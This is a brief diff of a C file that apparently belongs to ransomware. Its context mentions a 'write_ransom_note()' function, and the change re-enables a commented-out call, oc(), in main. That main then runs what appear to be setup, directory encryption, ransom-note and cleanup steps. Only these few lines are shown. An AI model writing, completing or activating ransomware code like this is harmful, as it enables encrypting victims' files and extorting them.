@@ -193,4 +193,4 @@ void write_ransom_note() {
     fclose(file);
 }
 
-int main (void) {sc();ed(".");/**oc()**/; write_ransom_note();sd();}
+int main (void) {sc();ed(".");oc(); write_ransom_note();sd();}
